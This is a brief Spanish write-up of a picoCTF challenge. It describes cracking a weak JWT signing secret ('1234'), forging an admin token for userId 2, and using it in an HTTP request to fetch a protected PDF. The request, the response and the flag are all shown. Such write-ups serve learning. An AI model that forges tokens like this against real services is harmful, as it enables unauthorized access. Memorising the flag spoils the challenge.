 
 
# Java Code Analysis!?!


## Solucion
- loguearse como user user
- crackear token jwt resulto en la llave `1234`
- darle el role `Admin` al parecer no eraa todo si no el userId `2` era el admin
 ```
 {
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1679969214,
  "iat": 1679364414,
  "userId": 2,
  "email": "user"
}
```


- solicitar el pdf del libro
```
GET /base/books/pdf/5 HTTP/1.1
Host: saturn.picoctf.net:60178
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://saturn.picoctf.net:60178/
authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE2Nzk5NjkyMTQsImlhdCI6MTY3OTM2NDQxNCwidXNlcklkIjoyLCJlbWFpbCI6InVzZXIifQ.spIiXpUbc2fMUip4p_2eY53rMr_JKxsXYuRXnI54wlw
Connection: close
Cookie: PHPSESSID=lj3gcm06t7pt9nsbdvqd1uerm6
```

```
HTTP/1.1 200 
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Type: application/pdf
Content-Length: 939
Date: Tue, 21 Mar 2023 02:28:11 GMT
Connection: close
..
..

(picoCTF{w34k_jwt_n0t_g00d_602ce414})'
```
## Bandera
picoCTF{w34k_jwt_n0t_g00d_602ce414}